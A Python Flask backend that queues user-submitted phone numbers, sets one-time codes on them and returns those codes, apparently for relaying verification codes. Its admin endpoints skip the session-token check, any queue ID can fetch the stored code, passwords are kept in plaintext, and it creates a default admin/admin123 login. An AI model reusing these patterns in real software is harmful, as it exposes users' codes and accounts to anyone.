from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
import json
import os
import uuid
import time
from datetime import datetime

app = Flask(__name__, static_folder='.')
CORS(app)

# Data file
DB_FILE = 'database.json'
CONFIG_FILE = 'config.json'

def load_db():
    if os.path.exists(DB_FILE):
        with open(DB_FILE, 'r') as f:
            return json.load(f)
    return {"queues": {"A": [], "B": [], "C": []}, "users": [], "history": []}

def save_db(data):
    with open(DB_FILE, 'w') as f:
        json.dump(data, f, indent=2)

def load_config():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'r') as f:
            return json.load(f)
    return {"admins": []}

def save_config(data):
    with open(CONFIG_FILE, 'w') as f:
        json.dump(data, f, indent=2)

# ============================================================
# ROUTES
# ============================================================

@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@app.route('/admin')
def admin():
    return send_from_directory('.', 'admin.html')

@app.route('/api/submit', methods=['POST'])
def submit_number():
    data = request.json
    number = data.get('number')
    country = data.get('country')
    network = data.get('network')
    queue_letter = data.get('queue', 'C')
    
    # Generate unique ID
    queue_id = str(uuid.uuid4())[:8]
    
    # Add to queue
    db = load_db()
    if queue_letter not in db['queues']:
        db['queues'][queue_letter] = []
    
    entry = {
        'id': queue_id,
        'number': number,
        'country': country,
        'network': network,
        'timestamp': datetime.now().isoformat(),
        'status': 'pending',
        'otp_length': 4,  # default
        'otp': None,
        'verified': False
    }
    
    db['queues'][queue_letter].append(entry)
    save_db(db)
    
    return jsonify({'success': True, 'queueId': queue_id, 'queue': queue_letter})

@app.route('/api/verify', methods=['POST'])
def verify_otp():
    data = request.json
    queue_id = data.get('queueId')
    otp = data.get('otp')
    action = data.get('action', 'verify')
    
    db = load_db()
    
    for queue_letter, entries in db['queues'].items():
        for entry in entries:
            if entry['id'] == queue_id:
                if action == 'verify':
                    if entry.get('otp') == otp:
                        entry['status'] = 'verified'
                        entry['verified'] = True
                        save_db(db)
                        return jsonify({'success': True, 'message': 'Verified!'})
                    else:
                        return jsonify({'success': False, 'message': 'Invalid OTP'})
                
                elif action == 'get_otp':
                    return jsonify({'success': True, 'otp': entry.get('otp')})
    
    return jsonify({'success': False, 'message': 'Queue entry not found'})

@app.route('/api/admin/queues', methods=['GET'])
def get_queues():
    db = load_db()
    return jsonify(db['queues'])

@app.route('/api/admin/next', methods=['POST'])
def get_next_number():
    data = request.json
    queue_letter = data.get('queue', 'C')
    
    db = load_db()
    if queue_letter not in db['queues']:
        return jsonify({'success': False, 'message': 'Queue not found'})
    
    for entry in db['queues'][queue_letter]:
        if entry['status'] == 'pending':
            return jsonify({'success': True, 'entry': entry})
    
    return jsonify({'success': False, 'message': 'No pending numbers'})

@app.route('/api/admin/update', methods=['POST'])
def update_entry():
    data = request.json
    queue_id = data.get('queueId')
    action = data.get('action')  # 'wrong', 'verified', 'otp_4', 'otp_6'
    otp_value = data.get('otp')
    
    db = load_db()
    
    for queue_letter, entries in db['queues'].items():
        for entry in entries:
            if entry['id'] == queue_id:
                if action == 'wrong':
                    entry['status'] = 'wrong'
                elif action == 'verified':
                    entry['status'] = 'verified'
                    entry['verified'] = True
                elif action == 'otp_4':
                    entry['otp_length'] = 4
                    entry['otp'] = otp_value or str(1000 + (int(queue_id, 16) % 9000))
                elif action == 'otp_6':
                    entry['otp_length'] = 6
                    entry['otp'] = otp_value or str(100000 + (int(queue_id, 16) % 900000))
                
                save_db(db)
                return jsonify({'success': True})
    
    return jsonify({'success': False, 'message': 'Entry not found'})

@app.route('/api/admin/auth', methods=['POST'])
def admin_auth():
    data = request.json
    username = data.get('username')
    password = data.get('password')
    
    config = load_config()
    for admin in config['admins']:
        if admin['username'] == username and admin['password'] == password:
            # Generate session token
            token = str(uuid.uuid4())
            admin['token'] = token
            admin['last_login'] = datetime.now().isoformat()
            save_config(config)
            return jsonify({'success': True, 'token': token})
    
    return jsonify({'success': False, 'message': 'Invalid credentials'})

@app.route('/api/admin/verify_token', methods=['POST'])
def verify_token():
    data = request.json
    token = data.get('token')
    
    config = load_config()
    for admin in config['admins']:
        if admin.get('token') == token:
            return jsonify({'success': True, 'username': admin['username']})
    
    return jsonify({'success': False})

# ============================================================
# INIT
# ============================================================

if __name__ == '__main__':
    # Create default admin if none exists
    config = load_config()
    if not config['admins']:
        config['admins'].append({
            'username': 'admin',
            'password': 'admin123',
            'created': datetime.now().isoformat()
        })
        save_config(config)
        print("✅ Default admin created: admin / admin123")
    
    app.run(host='0.0.0.0', port=5000, debug=False)